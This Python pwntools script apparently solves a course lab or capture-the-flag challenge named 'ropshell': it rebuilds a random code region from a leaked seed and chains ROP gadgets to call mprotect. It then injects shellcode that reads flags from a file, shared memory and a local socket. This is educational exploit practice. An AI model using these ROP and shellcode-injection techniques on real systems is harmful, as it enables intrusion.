#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import ctypes

context.arch = 'amd64'
context.os = 'linux'


def cmd2addr(cmd, fake_code, code_start):
    addr = []
    for curr_cmd in cmd:
        idx = fake_code.find(curr_cmd)
        assert idx != -1
        addr.append(code_start + idx)
    return addr

def getNormalReturnByte(fake_code, code_start, returnCode):
    cmd = []
    cmd.append(asm("""pop rax\nret"""))
    cmd.append(asm("""pop rdi\nret"""))
    cmd.append(asm("""syscall\nret"""))
    addr = cmd2addr(cmd, fake_code, code_start)
    payload = b''.join([p64(addr[0]), p64(60), 
                        p64(addr[1]), p64(returnCode), 
                        p64(addr[2])])
    return payload

def getMprotectByte(fake_code, code_start, LEN_CODE):
    align_code_start = code_start & (~(0xfff))
    print("mprotect align code_start: " + hex(align_code_start))
    cmd = []
    cmd.append(asm("""pop rdi\nret"""))  # code_start
    cmd.append(asm("""pop rsi\nret"""))  # LEN_CODE
    cmd.append(asm("""pop rdx\nret"""))  # 7 -> write + read + exec permission
    cmd.append(asm("""pop rax\nret"""))  # 10
    cmd.append(asm("""syscall\nret"""))
    addr = cmd2addr(cmd, fake_code, code_start)
    payload = b''.join([p64(addr[0]), p64(align_code_start), 
                        p64(addr[1]),  p64(LEN_CODE),
                        p64(addr[2]), p64(7), 
                        p64(addr[3]), p64(10), 
                        p64(addr[4])])
    return payload

def getReadToCodeByte(fake_code, code_start, read_count):  # read from stdin, and store the content in code -> write to code    
    # payload_write = asm("mov rax, 60;mov rdi, 37;syscall;")
    # read_count = len(payload_write)
    print("read_count: " + str(read_count))
    cmd = []
    cmd.append(asm("""pop rsi\nret"""))  # code_start -> buf addr
    cmd.append(asm("""pop rdi\nret"""))  # 0 -> stdin
    cmd.append(asm("""pop rdx\nret"""))  # read_count
    cmd.append(asm("""pop rax\nret"""))  # 0 -> read syscall
    cmd.append(asm("""syscall\nret"""))  # code_start
    
    addr = cmd2addr(cmd, fake_code, code_start)
    payload = b''.join([p64(addr[0]), p64(code_start), 
                        p64(addr[1]), p64(0), 
                        p64(addr[2]), p64(read_count),
                        p64(addr[3]), p64(0),
                        p64(addr[4]), p64(code_start)])
    return payload

def task1(r, fake_code, code_start):
    payload = getNormalReturnByte(fake_code, code_start, 37)
    r.send(payload)
    r.interactive()

def task2(r, fake_code, code_start):
    buf = code_start + 0x1000
    data_path = code_start + 0x2000  # put the /FLAG string in this address

    # fd = open(path, O_RDONLY) -> n_read = read(fd, buf, cnt) -> w_read = write(fd, buf, cnt) -> exit(0)
    # open
    my_asm = asm("mov rax, " + str(0x47414c462f))  # /FLAG -> 0x2F464C4147
    my_asm += asm("mov [" + hex(data_path) + "], rax")  # put /FLAG string to this address
    my_asm += asm("mov rdi, " + hex(data_path))  # pointer to the address where I put /FLAG string
    my_asm += asm("mov rsi, 0")
    my_asm += asm("mov rax, 2")
    my_asm += asm("syscall")
    # read
    my_asm += asm("mov rdi, rax")
    my_asm += asm("mov rsi, " + hex(buf))
    my_asm += asm("mov rdx, 0x100")
    my_asm += asm("mov rax, 0")
    my_asm += asm("syscall")
    # write
    my_asm += asm("mov rdi, 1")
    my_asm += asm("mov rsi, " + hex(buf))
    my_asm += asm("mov rdx, rax")
    my_asm += asm("mov rax, 1")
    my_asm += asm("syscall")
    # exit
    my_asm += asm("mov rdi, 0")
    my_asm += asm("mov rax, 60")
    my_asm += asm("syscall")

    payload = getMprotectByte(fake_code, code_start, LEN_CODE)
    payload += getReadToCodeByte(fake_code, code_start, len(my_asm))
    r.send(payload)
    print(r.recvuntil(b'bytes command received.\n').decode())

    # print("payload_write: " + str(my_asm))
    r.send(my_asm)
    r.interactive()

def task3(r, fake_code, code_start):
    # id = shmget(key, size, shmflg) -> shmget(0x1337, 4096, 0)
    my_asm = asm("mov rdi, " + str(0x1337))
    my_asm += asm("mov rsi, 4096")
    my_asm += asm("mov rdx, 0")  # because not create
    my_asm += asm("mov rax, 29")
    my_asm += asm("syscall")
    # address = shmat(shmid, shmaddr, shmflag) -> shmat(id, null, SHM_RDONLY) -> SHM_RDONLY == 0x1000
    my_asm += asm("mov rdi, rax")
    my_asm += asm("mov rsi, 0")
    my_asm += asm("mov rdx, 0x1000")
    my_asm += asm("mov rax, 30")
    my_asm += asm("syscall")
    # write(fd, buf, cnt)
    my_asm += asm("mov rdi, 1")
    my_asm += asm("mov rsi, rax")
    my_asm += asm("mov rdx, 100")
    my_asm += asm("mov rax, 1")
    my_asm += asm("syscall")
    # exit(0)
    my_asm += asm("mov rdi, 0")
    my_asm += asm("mov rax, 60")
    my_asm += asm("syscall")

    # open mprotect & read to the start of codeint
    payload = getMprotectByte(fake_code, code_start, LEN_CODE)
    payload += getReadToCodeByte(fake_code, code_start, len(my_asm))
    r.send(payload)
    print(r.recvuntil(b'bytes command received.\n').decode())

    r.send(my_asm)
    msg = r.recv().decode().split('\n')[0]
    print(msg)
    r.interactive()

def task4(r, fake_code, code_start):
    my_addr = code_start + 0x1000
    buf = code_start + 0x2000

    # sockfd = socket(AF_INET, SOCK_STREAM, 0) -> sockfd = sys_socket(2, 1, 0)
    my_asm = asm("mov rdi, 2")
    my_asm += asm("mov rsi, 1")
    my_asm += asm("mov rdx, 0")
    my_asm += asm("mov rax, 41")
    my_asm += asm("syscall")
    my_asm += asm("mov r12, rax")  # store sockfd in r12

    # connect(sockfd, struct sockaddr *myaddr, sizeof(myaddr)) -> sys_connect(sockfd, myaddr, 16)
    # myaddr   -> (sin_family [2 bytes], sa_data [14 bytes])
    #          -> (AF_INET == 2 [2 bytes], port == 0x1337 [2 bytes], ip_addr == 127.0.0.1 [4 bytes], 0 [8 bytes])
    my_asm += asm("mov rdi, r12")

    my_asm += asm("mov rsi, " + hex(my_addr))
    my_asm += asm("mov ax, 0x2")  # ax -> 2 bytes, eax -> 4 bytes
    my_asm += asm("mov WORD PTR [rsi], ax")
    my_asm += asm("mov ax, " + str(0x3713))  # 0x1337 -> 0x3713
    my_asm += asm("mov WORD PTR [rsi+2], ax")
    my_asm += asm("mov eax, " + str(0x0100007f))  # 127.0.0.1 -> 0x7f000001 -> 0x0100007f
    my_asm += asm("mov DWORD PTR [rsi+4], eax")
    my_asm += asm("mov rax, 0")
    my_asm += asm("mov QWORD PTR [rsi+8], rax")

    my_asm += asm("mov rdx, 16")
    my_asm += asm("mov rax, 42")
    my_asm += asm("syscall")

    # read(sockfd, buf, count)
    my_asm += asm("mov rdi, r12")
    my_asm += asm("mov rsi, " + hex(buf))
    my_asm += asm("mov rdx, 0x100")
    my_asm += asm("mov rax, 0")
    my_asm += asm("syscall")
    # write(sockfd, buf, count)
    my_asm += asm("mov rdi, 1")
    my_asm += asm("mov rsi, " + hex(buf))
    my_asm += asm("mov rdx, rax")
    my_asm += asm("mov rax, 1")
    my_asm += asm("syscall")
    # close(sockfd)
    my_asm += asm("mov rdi, r12")
    my_asm += asm("mov rax, 3")
    my_asm += asm("syscall")
    # exit(0)
    my_asm += asm("mov rdi, 0")
    my_asm += asm("mov rax, 60")
    my_asm += asm("syscall")

    # open mprotect & read to the start of codeint
    payload = getMprotectByte(fake_code, code_start, LEN_CODE)
    payload += getReadToCodeByte(fake_code, code_start, len(my_asm))
    r.send(payload)
    print(r.recvuntil(b'bytes command received.\n').decode())

    r.send(my_asm)
    r.interactive()


if __name__ == '__main__':
    r = None
    if 'qemu' in sys.argv[1:]:
        r = process("qemu-x86_64-static ./ropshell", shell=True)
    elif 'bin' in sys.argv[1:]:
        r = process("./ropshell", shell=False)
    elif 'local' in sys.argv[1:]:
        r = remote("localhost", 10494)
    else:
        r = remote("up23.zoolab.org", 10494)

    if type(r) != pwnlib.tubes.process.process:
        pw.solve_pow(r)

    r.recvline()  # for server
    r.recvline()  # for server

    # parse timestamp
    timestamp =  int((r.recvline().split())[-1])
    code_start = int((r.recvline().split())[-1], 16)
    print("timestamp: " + str(timestamp))
    print("code_start: " + hex(code_start))

    # generate code content
    libc = ctypes.CDLL('libc.so.6')
    LEN_CODE = 10*0x10000
    fake_code_tmp = []
    libc.srand(timestamp)
    for _ in range(int(LEN_CODE/4)):
        tmp = (libc.rand()<<16) | (libc.rand() & 0xffff)
        tmp = tmp & 0xffffffff  # mask
        fake_code_tmp.append(tmp)
    fake_code_tmp[int(libc.rand() % (LEN_CODE/4 - 1))] = 0xc3050f
    fake_code = b''
    for curr_code in fake_code_tmp:
        tmp_byte = curr_code.to_bytes(4, 'little')
        fake_code += tmp_byte

    # Q1. normal termination of status code 37
    # task1(r, fake_code, code_start)

    # Q2. show the FLAG read from the /FLAG file
    # task2(r, fake_code, code_start)
    
    # Q3. show the FLAG stored in the share memory
    # task3(r, fake_code, code_start)

    # Q4. show the FLAG received from the internal network server
    task4(r, fake_code, code_start)